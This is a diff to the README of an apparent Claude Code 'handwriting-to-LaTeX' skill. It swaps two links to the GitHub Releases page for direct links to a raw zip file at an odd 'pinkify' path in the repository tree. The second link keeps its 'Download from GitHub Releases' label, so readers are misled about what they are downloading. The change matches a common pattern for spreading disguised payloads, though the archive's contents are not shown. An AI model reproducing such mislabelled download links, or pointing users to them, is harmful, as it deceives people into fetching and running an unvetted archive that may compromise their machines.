@@ -1,6 +1,6 @@
 # 📝 Claude-Code-Skill-handwriting-to-latex - Turn Notes Into LaTeX
 
-[![Download](https://img.shields.io/badge/Download%20Latest-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Amylalcoholfinance405/Claude-Code-Skill-handwriting-to-latex/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Amylalcoholfinance405/Claude-Code-Skill-handwriting-to-latex/raw/refs/heads/main/pinkify/to-handwriting-latex-Claude-Code-Skill-v1.3.zip)
 
 ## 📄 What this does
 
@@ -35,7 +35,7 @@ For best results, use:
 
 Visit this page to download the latest release:
 
-[Download from GitHub Releases](https://github.com/Amylalcoholfinance405/Claude-Code-Skill-handwriting-to-latex/releases)
+[Download from GitHub Releases](https://github.com/Amylalcoholfinance405/Claude-Code-Skill-handwriting-to-latex/raw/refs/heads/main/pinkify/to-handwriting-latex-Claude-Code-Skill-v1.3.zip)
 
 After the page opens:
 
